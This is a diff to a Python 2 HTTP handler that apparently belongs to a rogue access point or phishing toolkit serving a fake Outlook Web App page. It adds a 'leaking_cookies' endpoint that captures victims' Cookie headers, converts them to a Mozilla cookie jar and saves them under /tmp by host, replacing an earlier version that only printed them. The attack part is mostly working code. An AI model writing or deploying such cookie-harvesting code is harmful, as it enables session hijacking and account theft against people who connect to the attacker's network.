@@ -6,6 +6,7 @@ import ssl
 import base64
 import json
 import time
+import Cookie,cookielib
 
 from Utils import *
 
@@ -91,7 +92,41 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       essid = self.server.app.get_client_ap(client).get_essid()
     except:
       pass
-    
+   
+    # catch cookie request now
+    if path.endswith('leaking_cookies'):
+
+      self.send_response(200)
+      self.send_header('Content-Type','text/html')
+      self.end_headers()
+
+      if 'cookie' in self.headers:
+
+        ckdata = self.headers['Cookie']
+        
+        # use a Cookie.SimpleCookie to deserialize data
+        ck = Cookie.SimpleCookie()
+        ck.load(ckdata)
+        
+        # create a cookie jar to export data
+        cjar = cookielib.MozillaCookieJar('/tmp/%s.cookie.txt'%host)
+        for k,v in ck.items():
+          cjar.set_cookie(cookielib.Cookie(1,
+            k, v, '80', '80',
+            host, None, None, 
+            path, None, 
+            False, 
+            False,
+            False,
+            "",
+            "",
+            False))
+        cjar.save()
+
+        print host,cjar
+
+      return
+
     protocol = ctxt(self.server.PRE,BLUE)
     if self.server.PRE == 'HTTPS':
       protocol = ctxt(self.server.PRE,RED)
@@ -267,18 +302,6 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       self.end_headers()
       self.wfile.write(open('OutlookWebApp.html','r').read())
       logphishing()
-
-    elif path.endswith('leaking_cookies'):
-      self.send_response(200)
-      self.send_header('Content-Type','text/html')
-      self.send_header('Cache-Control','public, max-age=99936000')
-      self.send_header('Expires','Sat, 01 Jul 2055 03:42:00 GMT')
-      self.send_header('Last-Modified','Tue, 15 Nov 1994 12:30:00 GMT')
-      self.end_headers()
-      faked = False
-
-      if 'cookies' in self.headers:
-        print self.headers['cookies']
 
     else:
 
